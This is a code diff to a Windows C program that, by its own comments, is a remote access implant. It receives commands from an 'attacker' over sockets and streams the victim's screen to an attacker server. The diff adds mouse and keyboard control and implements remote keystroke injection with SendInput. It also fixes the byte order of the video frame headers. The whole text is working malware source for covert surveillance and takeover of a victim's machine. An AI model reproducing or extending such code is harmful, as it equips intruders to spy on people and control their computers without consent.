@@ -1,4 +1,5 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS // TODO - fix this
+#define WINVER 0x0500 // required to use SendInput() function
 
 #include <winsock2.h> // windows socket header
 #include <shlwapi.h> // useful functions for directory traversal
@@ -38,6 +39,16 @@
 #define PRINT_INFO 15
 // inform the attacker what the current directory is
 #define NEW_CURR_DIR 16
+// constants for controlling the mouseand keyboard
+#define MOUSE_POS 17 /* this will be followed by X, Y coords for the mouse */
+#define MOUSE_DOWN 18 /* this will be followed by MOUSE_LEFT, MOUSE_RIGHT, or MOUSE_MIDDLE */
+#define MOUSE_UP 19 /* same as MOUSE_DOWN */
+#define MOUSE_LEFT 20
+#define MOUSE_RIGHT 21
+#define MOUSE_MIDDLE 22
+#define MOUSE_WHEEL 23 /* this will be followed by a number to specify the scroll amount */
+#define KEY_DOWN 24 /* this will be followed by a Windows virtual-key code */
+#define KEY_UP 25 /* same as KEY_DOWN */
 
 // define useful globals
 char currDir[MAX_PATH]; // name of the current directory
@@ -45,6 +56,8 @@ SOCKET mainSock; // main socket used to receive commands and send info
 SOCKET videoSock; // socket used to send video data to attacker server
 int videoOn = 0; // boolean for whether the video stream is running
 HANDLE videoThread; // handle for thread that sends video to attacker
+int mouseControl = 0; // flag for if mouse is being controlled
+int keyboardControl = 0; // flag for if keyboard is being controlled
 
 DWORD WINAPI test(void* data);
 void connectToVideo();
@@ -236,15 +249,45 @@ char handleCommand(char* buffer) {
 	} else if (cmd == END_AUDIO) {
 		// TODO - determine how best to stop audio stream
 	} else if (cmd == START_KEYS) {
-		printf("Taking control of keyboard...\n");
+		printf("Keyboard is being controlled\n");
+		keyboardControl = 1;
 		// get the port to connect to
-		int port = (buffer[1] * 256) + buffer[2];
-		printf("Attacker is controlling keyboard from port %d\n", port);
+		//int port = (buffer[1] * 256) + buffer[2];
+		//printf("Attacker is controlling keyboard from port %d\n", port);
 		//controlKeyboard(port);
 	} else if (cmd == END_KEYS) {
 		// TODO - determine how best to stop keyboard control
+		printf("Keyboard has been released\n");
+		keyboardControl = 0;
 	} else if (cmd == KILL_PROC) {
 		printf("Ending process...\n");
+	} else if (mouseControl == 1) { // check for mouse inputs if the mouse is being controlled
+		if (cmd == MOUSE_DOWN) {
+
+		} else if (cmd == MOUSE_UP) {
+
+		} else if (cmd == MOUSE_WHEEL) {
+
+		}
+	} else if (keyboardControl == 1) { // check for key inputs if the keyboard is being controlled
+		// assume we will be sending a key input and create the INPUT structure
+		// this shouldn't be that big of a time waste if we don't send an input
+		INPUT in; // INPUT structure to send
+		in.type = INPUT_KEYBOARD; // this is a keyboard input
+		in.ki.wScan = 0; // not using the scan code
+		in.ki.time = 0; // let the system generate a timestamp
+		in.ki.dwExtraInfo = 0; // no extra info to send
+		in.ki.wVk = buffer[1]; // set the virtual key-code to what we received
+		// check if we're sending an input, and whether that input is a key press or key release
+		if (cmd == KEY_DOWN) {
+			in.ki.dwFlags = 0; // no flags (0) for key press
+			if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+				printf("Error inserting key press into input stream: %d\n", GetLastError()); }
+		} else if (cmd == KEY_UP) {
+			in.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
+			if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+				printf("Error inserting key press into input stream: %d\n", GetLastError()); }
+		}
 	} else {
 		printf("Unknown command received: %d\n", cmd);
 	}
@@ -434,9 +477,9 @@ void videoStreamTest() {
 
 	// send frame info (width, height, size) before frame data
 	int buff[3];
-	buff[0] = width;
-	buff[1] = height;
-	buff[2] = fileSize;
+	buff[0] = htonl(width);
+	buff[1] = htonl(height);
+	buff[2] = htonl(fileSize);
 	retCode = send(videoSock, buff, 12, 0);
 	if (retCode == SOCKET_ERROR) {
 		printf("Could not send data: %d\n", WSAGetLastError());
@@ -444,7 +487,7 @@ void videoStreamTest() {
 	}
 
 	// print the size of the bitmap for the current frame - used for debug
-	printf("Frame %d x & y: %d x %d\n", frames++, width, height);
+	//printf("Frame %d x & y: %d x %d\n", frames++, width, height);
 
 	// vertically flip the image - just something with how the screen capture works
 	for (int row = 0; row < height; row++) {
